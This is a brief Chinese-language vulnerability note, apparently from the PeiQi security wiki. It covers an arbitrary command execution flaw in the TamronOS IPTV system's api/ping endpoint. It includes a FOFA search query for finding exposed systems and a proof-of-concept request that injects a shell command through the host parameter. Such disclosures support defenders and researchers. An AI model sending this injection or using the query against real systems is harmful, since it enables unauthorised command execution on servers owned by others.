---
title: TamronOS IPTV系统 ping 任意命令执行漏洞
date: 2021-09-23 23:55:51
tags: PeiQi文库
categories:
 - Web应用漏洞
 - TamronOS
---

# TamronOS IPTV系统 ping 任意命令执行漏洞

## 漏洞描述

TamronOS IPTV系统 api/ping 存在任意命令执行漏洞，攻击者通过漏洞可以执行任意命令

## 漏洞影响

> [!NOTE]
>
> TamronOS IPTV系统

## FOFA

> [!NOTE]
>
> app="TamronOS-IPTV系统"

## 漏洞复现

登录页面如下

![image-20210615145308242](/img/20210924020301684934.png)

漏洞POC为

```
/api/ping?count=5&host=;id;
```

![image-20210615145342322](/img/20210924020301973033.png)